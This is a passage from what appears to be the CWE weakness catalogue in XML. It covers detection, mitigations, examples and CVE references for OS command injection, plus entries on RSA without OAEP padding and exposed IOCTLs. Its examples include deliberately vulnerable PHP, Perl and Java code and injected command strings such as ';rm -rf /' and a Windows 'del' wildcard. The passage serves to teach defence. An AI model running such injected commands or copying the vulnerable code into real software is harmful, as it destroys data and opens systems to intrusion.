                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>If at all possible, use library calls rather than external processes to recreate the desired functionality.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-22">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Sandbox or Jail</Strategy>
               <Description>
                  <xhtml:p>Run the code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.</xhtml:p>
                  <xhtml:p>OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.</xhtml:p>
                  <xhtml:p>This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.</xhtml:p>
                  <xhtml:p>Be careful to avoid CWE-243 and other weaknesses related to jails.</xhtml:p>
               </Description>
               <Effectiveness>Limited</Effectiveness>
               <Effectiveness_Notes>The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>For any data that will be used to generate a command to be executed, keep as much of that data out of external control as possible. For example, in web applications, this may require storing the data locally in the session's state instead of sending it out to the client in a hidden form field.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Phase>Architecture and Design</Phase>
               <Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4.3">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>For example, consider using the ESAPI Encoding control [REF-45] or a similar tool, library, or framework. These will help the programmer encode outputs in a manner less prone to error.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-28">
               <Phase>Implementation</Phase>
               <Strategy>Output Encoding</Strategy>
               <Description>While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>If the program to be executed allows arguments to be specified within an input file or from standard input, then consider using that mode to pass arguments instead of the command line.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-27">
               <Phase>Architecture and Design</Phase>
               <Strategy>Parameterization</Strategy>
               <Description>
                  <xhtml:p>If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.</xhtml:p>
                  <xhtml:p>Some languages offer multiple functions that can be used to invoke commands. Where possible, identify any function that invokes a command shell using a single string, and replace it with a function that requires individual arguments. These functions typically perform appropriate quoting and filtering of arguments. For example, in C, the system() function accepts a string that contains the entire command to be executed, whereas execl(), execve(), and others require an array of strings, one for each argument. In Windows, CreateProcess() only accepts one command at a time. In Perl, if system() is provided with an array of arguments, then it will quote each of the arguments.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>When constructing OS command strings, use stringent whitelists that limit the character set based on the expected value of the parameter in the request. This will indirectly limit the scope of an attack, but this technique is less important than proper output encoding and escaping.</xhtml:p>
                  <xhtml:p>Note that proper output encoding, escaping, and quoting is the most effective solution for preventing OS command injection, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent OS command injection, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, when invoking a mail program, you might need to allow the subject field to contain otherwise-dangerous inputs like ";" and "&gt;" characters, which would need to be escaped or otherwise handled. In this case, stripping the character might reduce the risk of OS command injection, but it would produce incorrect behavior because the subject field would not be recorded as the user intended. This might seem to be a minor inconvenience, but it could be more important when the program relies on well-structured subject lines in order to pass messages to other components.</xhtml:p>
                  <xhtml:p>Even if you make a mistake in your validation (such as forgetting one out of 100 input fields), appropriate encoding is still likely to protect you from injection-based attacks. As long as it is not done in isolation, input validation is still a useful technique, since it may significantly reduce your attack surface, allow you to detect some attacks, and provide other security benefits that proper encoding does not address.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-21">
               <Phase>Architecture and Design</Phase>
               <Strategy>Enforcement by Conversion</Strategy>
               <Description>When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-32">
               <Phase>Operation</Phase>
               <Strategy>Compilation or Build Hardening</Strategy>
               <Description>Run the code in an environment that performs automatic taint propagation and prevents any command execution that uses tainted variables, such as Perl's "-T" switch. This will force the program to perform validation steps that remove the taint, although you must be careful to correctly validate your inputs so that you do not accidentally mark dangerous inputs as untainted (see CWE-183 and CWE-184).</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-32">
               <Phase>Operation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>Run the code in an environment that performs automatic taint propagation and prevents any command execution that uses tainted variables, such as Perl's "-T" switch. This will force the program to perform validation steps that remove the taint, although you must be careful to correctly validate your inputs so that you do not accidentally mark dangerous inputs as untainted (see CWE-183 and CWE-184).</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-39">
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>Ensure that error messages only contain minimal details that are useful to the intended audience, and nobody else. The messages need to strike the balance between being too cryptic and not being cryptic enough. They should not necessarily reveal the methods that were used to determine the error. Such detailed information can be used to refine the original attack to increase the chances of success.</xhtml:p>
                  <xhtml:p>If errors must be tracked in some detail, capture them in log messages - but consider what could occur if the log messages can be viewed by attackers. Avoid recording highly sensitive information such as passwords in any form. Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a username is valid or not.</xhtml:p>
                  <xhtml:p>In the context of OS Command Injection, error information passed back to the user might reveal whether an OS command is being executed and possibly which command is being used.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Operation</Phase>
               <Strategy>Sandbox or Jail</Strategy>
               <Description>Use runtime policy enforcement to create a whitelist of allowable commands, then prevent use of any command that does not appear in the whitelist. Technologies such as AppArmor are available to do this.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-29">
               <Phase>Operation</Phase>
               <Strategy>Firewall</Strategy>
               <Description>Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.</Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-17">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-16">
               <Phase>Operation</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>This example code intends to take the name of a user and list the contents of that user's home directory. It is subject to the first variant of OS command injection.</Intro_Text>
               <Example_Code Nature="bad" Language="PHP">
                  <xhtml:div>$userName = $_POST["user"];<xhtml:br/>$command = 'ls -l /home/' . $userName;<xhtml:br/>system($command);</xhtml:div>
               </Example_Code>
               <Body_Text>The $userName variable is not checked for malicious input. An attacker could set the $userName variable to an arbitrary OS command such as:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>;rm -rf /</xhtml:div>
               </Example_Code>
               <Body_Text>Which would result in $command being:</Body_Text>
               <Example_Code Nature="result">
                  <xhtml:div>ls -l /home/;rm -rf /</xhtml:div>
               </Example_Code>
               <Body_Text>Since the semi-colon is a command separator in Unix, the OS would first execute the ls command, then the rm command, deleting the entire file system.</Body_Text>
               <Body_Text>Also note that this example code is vulnerable to Path Traversal (CWE-22) and Untrusted Search Path (CWE-426) attacks.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This example is a web application that intends to perform a DNS lookup of a user-supplied domain name. It is subject to the first variant of OS command injection.</Intro_Text>
               <Example_Code Nature="bad" Language="Perl">
                  <xhtml:div>use CGI qw(:standard);<xhtml:br/>$name = param('name');<xhtml:br/>$nslookup = "/path/to/nslookup";<xhtml:br/>print header;<xhtml:br/>if (open($fh, "$nslookup $name|")) {<xhtml:div style="margin-left:10px;">while (&lt;$fh&gt;) {<xhtml:div style="margin-left:10px;">print escapeHTML($_);<xhtml:br/>print "&lt;br&gt;\n";</xhtml:div>}<xhtml:br/>close($fh);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Suppose an attacker provides a domain name like this:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>cwe.mitre.org%20%3B%20/bin/ls%20-l</xhtml:div>
               </Example_Code>
               <Body_Text>The "%3B" sequence decodes to the ";" character, and the %20 decodes to a space. The open() statement would then process a string like this:</Body_Text>
               <Example_Code Nature="result">
                  <xhtml:div>/path/to/nslookup cwe.mitre.org ; /bin/ls -l</xhtml:div>
               </Example_Code>
               <Body_Text>As a result, the attacker executes the "/bin/ls -l" command and gets a list of all the files in the program's working directory. The input could be replaced with much more dangerous commands, such as installing a malicious program on the server.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The example below reads the name of a shell script to execute from the system properties. It is subject to the second variant of OS command injection.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>String script = System.getProperty("SCRIPTNAME");<xhtml:br/>if (script != null)<xhtml:div style="margin-left:10px;">System.exec(script);</xhtml:div>
                  </xhtml:div>
               </Example_Code>
               <Body_Text>If an attacker has control over this property, then they could modify the property to point to a dangerous program.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>In the example below, a method is used to transform geographic coordinates from latitude and longitude format to UTM format. The method gets the input coordinates from a user through a HTTP request and executes a program local to the application server that performs the transformation. The method passes the latitude and longitude coordinates as a command-line option to the external program and will perform some processing to retrieve the results of the transformation and return the resulting UTM coordinates.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>public String coordinateTransformLatLonToUTM(String coordinates)<xhtml:br/>{<xhtml:div style="margin-left:10px;">
                        <xhtml:div>String utmCoords = null;<xhtml:br/>try {<xhtml:div style="margin-left:10px;">
                              <xhtml:div>String latlonCoords = coordinates;<xhtml:br/>Runtime rt = Runtime.getRuntime();<xhtml:br/>Process exec = rt.exec("cmd.exe /C latlon2utm.exe -" + latlonCoords);<xhtml:br/>
                                 <xhtml:i>// process results of coordinate transform</xhtml:i>
                                 <xhtml:br/>
                                 <xhtml:br/>
                                 <xhtml:i>// ...</xhtml:i>
                                 <xhtml:br/>
                              </xhtml:div>
                           </xhtml:div>}<xhtml:br/>catch(Exception e) {...}<xhtml:br/>return utmCoords;</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>However, the method does not verify that the contents of the coordinates input parameter includes only correctly-formatted latitude and longitude coordinates. If the input coordinates were not validated prior to the call to this method, a malicious user could execute another program local to the application server by appending '&amp;' followed by the command for another program to the end of the coordinate string. The '&amp;' instructs the Windows operating system to execute another program.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-28">
               <Intro_Text>The following code is from an administrative web application designed to allow users to kick off a backup of an Oracle database using a batch-file wrapper around the rman utility and then run a cleanup.bat script to delete some temporary files. The script rmanDB.bat accepts a single command line parameter, which specifies what type of backup to perform. Because access to the database is restricted, the application runs the backup as a privileged user.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>...<xhtml:br/>String btype = request.getParameter("backuptype");<xhtml:br/>String cmd = new String("cmd.exe /K \"<xhtml:div style="margin-left:10px;">c:\\util\\rmanDB.bat "<xhtml:br/>+btype+<xhtml:br/>"&amp;&amp;c:\\utl\\cleanup.bat\"")</xhtml:div>
                     <xhtml:br/>System.Runtime.getRuntime().exec(cmd);<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The problem here is that the program does not do any validation on the backuptype parameter read from the user. Typically the Runtime.exec() function will not execute multiple commands, but in this case the program first runs the cmd.exe shell in order to run multiple commands with a single call to Runtime.exec(). Once the shell is invoked, it will happily execute multiple commands separated by two ampersands. If an attacker passes a string of the form "&amp; del c:\\dbms\\*.*", then the application will execute this command along with the others specified by the program. Because of the nature of the application, it runs with the privileges necessary to interact with the database, which means whatever command the attacker injects will run with those privileges as well.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-1999-0067</Reference>
               <Description>Canonical example. CGI program does not neutralize "|" metacharacter when invoking a phonebook program.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0067</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1246</Reference>
               <Description>Language interpreter's mail function accepts another argument that is concatenated to a string used in a dangerous popen() call. Since there is no neutralization of this argument, both OS Command Injection (CWE-78) and Argument Injection (CWE-88) are possible.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1246</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0061</Reference>
               <Description>Web server allows command execution using "|" (pipe) character.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0061</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0041</Reference>
               <Description>FTP client does not filter "|" from filenames returned by the server, allowing for OS command injection.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0041</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2575</Reference>
               <Description>Shell metacharacters in a filename in a ZIP archive</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2575</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1898</Reference>
               <Description>Shell metacharacters in a telnet:// link are not properly handled when the launching application processes the link.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1898</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4304</Reference>
               <Description>OS command injection through environment variable.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4304</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4796</Reference>
               <Description>OS command injection through https:// URLs</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4796</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-3572</Reference>
               <Description>Chain: incomplete blacklist for OS command injection</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-3572</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-1988</Reference>
               <Description>Product allows remote users to execute arbitrary commands by creating a file whose pathname contains shell metacharacters.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-1988</Link>
            </Observed_Example>
         </Observed_Examples>
         <Functional_Areas>
            <Functional_Area>Program Invocation</Functional_Area>
         </Functional_Areas>
         <Affected_Resources>
            <Affected_Resource>System Process</Affected_Resource>
         </Affected_Resources>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>OS Command Injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A3</Entry_ID>
               <Entry_Name>Malicious File Execution</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A6</Entry_ID>
               <Entry_Name>Injection Flaws</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>ENV03-C</Entry_ID>
               <Entry_Name>Sanitize the environment when invoking external programs</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>ENV33-C</Entry_ID>
               <Entry_Name>Do not call system()</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>STR02-C</Entry_ID>
               <Entry_Name>Sanitize data passed to complex subsystems</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>31</Entry_ID>
               <Entry_Name>OS Commanding</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>IDS07-J</Entry_ID>
               <Entry_Name>Do not pass untrusted, unsanitized data to the Runtime.exec() method</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OMG ASCSM">
                <Entry_ID>ASCSM-CWE-78</Entry_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="108"/>
            <Related_Attack_Pattern CAPEC_ID="15"/>
            <Related_Attack_Pattern CAPEC_ID="43"/>
            <Related_Attack_Pattern CAPEC_ID="6"/>
            <Related_Attack_Pattern CAPEC_ID="88"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-140"/>
            <Reference External_Reference_ID="REF-685"/>
            <Reference External_Reference_ID="REF-686"/>
            <Reference External_Reference_ID="REF-687" Section="chapter: &#34;CGI Scripts&#34;"/>
            <Reference External_Reference_ID="REF-688"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 10: Command Injection.&#34; Page 171"/>
            <Reference External_Reference_ID="REF-690"/>
            <Reference External_Reference_ID="REF-45"/>
            <Reference External_Reference_ID="REF-76"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 8, &#34;Shell Metacharacters&#34;, Page 425"/>
            <Reference External_Reference_ID="REF-962" Section="ASCSM-CWE-78"/>
         </References>
         <Notes>
            <Note Type="Terminology">The "OS command injection" phrase carries different meanings to different people. For some people, it only refers to cases in which the attacker injects command separators into arguments for an application-controlled program that is being invoked. For some people, it refers to any type of attack that can allow the attacker to execute OS commands of their own choosing. This usage could include untrusted search path weaknesses (CWE-426) that cause the application to find and execute an attacker-controlled program. Further complicating the issue is the case when argument injection (CWE-88) allows alternate command-line switches or options to be inserted into the command line, such as an "-exec" switch whose purpose may be to execute the subsequent argument as a command (this -exec switch exists in the UNIX "find" command, for example). In this latter case, however, CWE-88 could be regarded as the primary weakness in a chain with CWE-78.</Note>
            <Note Type="Research Gap">More investigation is needed into the distinction between the OS command injection variants, including the role with argument injection (CWE-88). Equivalent distinctions may exist in other injection-related problems such as SQL injection.</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="780" Name="Use of RSA Algorithm without OAEP" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The software uses the RSA algorithm but does not incorporate Optimal Asymmetric Encryption Padding (OAEP), which might weaken the encryption.</Description>
         <Extended_Description>Padding schemes are often used with cryptographic algorithms to make the plaintext less predictable and complicate attack efforts. The OAEP scheme is often used with RSA to nullify the impact of predictable common text.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="327" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>Without OAEP in RSA encryption, it will take less work for an attacker to decrypt the data or to infer patterns from the ciphertext.</Note>
            </Consequence>
         </Common_Consequences>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The example below attempts to build an RSA cipher.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>public Cipher getRSACipher() {<xhtml:div style="margin-left:10px;">Cipher rsa = null;<xhtml:br/>try {<xhtml:div style="margin-left:10px;">rsa = javax.crypto.Cipher.getInstance("RSA/NONE/NoPadding");</xhtml:div>}<xhtml:br/>catch (java.security.NoSuchAlgorithmException e) {<xhtml:div style="margin-left:10px;">log("this should never happen", e);</xhtml:div>}<xhtml:br/>catch (javax.crypto.NoSuchPaddingException e) {<xhtml:div style="margin-left:10px;">log("this should never happen", e);</xhtml:div>}<xhtml:br/>return rsa;</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>While the previous code successfully creates an RSA cipher, the cipher does not use padding. The following code creates an RSA cipher using OAEP.</Body_Text>
               <Example_Code Nature="good" Language="Java">
                  <xhtml:div>public Cipher getRSACipher() {<xhtml:div style="margin-left:10px;">Cipher rsa = null;<xhtml:br/>try {<xhtml:div style="margin-left:10px;">rsa = javax.crypto.Cipher.getInstance("RSA/ECB/OAEPWithMD5AndMGF1Padding");</xhtml:div>}<xhtml:br/>catch (java.security.NoSuchAlgorithmException e) {<xhtml:div style="margin-left:10px;">log("this should never happen", e);</xhtml:div>}<xhtml:br/>catch (javax.crypto.NoSuchPaddingException e) {<xhtml:div style="margin-left:10px;">log("this should never happen", e);</xhtml:div>}<xhtml:br/>return rsa;</xhtml:div>}</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <References>
            <Reference External_Reference_ID="REF-694"/>
            <Reference External_Reference_ID="REF-695"/>
         </References>
         <Notes>
            <Note Type="Maintenance">This entry could probably have a new parent related to improper padding, however the role of padding in cryptographic algorithms can vary, such as hiding the length of the plaintext and providing additional random bits for the cipher. In general, cryptographic problems in CWE are not well organized and further research is needed.</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="782" Name="Exposed IOCTL with Insufficient Access Control" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>The software implements an IOCTL with functionality that should be restricted, but it does not properly enforce access control for the IOCTL.</Description>
         <Extended_Description>
            <xhtml:p>When an IOCTL contains privileged functionality and is exposed unnecessarily, attackers may be able to access this functionality by invoking the IOCTL. Even if the functionality is benign, if the programmer has assumed that the IOCTL would only be accessed by a trusted process, there may be little or no validation of the incoming data, exposing weaknesses that would never be reachable if the attacker cannot call the IOCTL directly.</xhtml:p>
            <xhtml:p>The implementations of IOCTLs will differ between operating system types and versions, so the methods of attack and prevention may vary widely.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="749" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="749" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="284" View_ID="699"/>
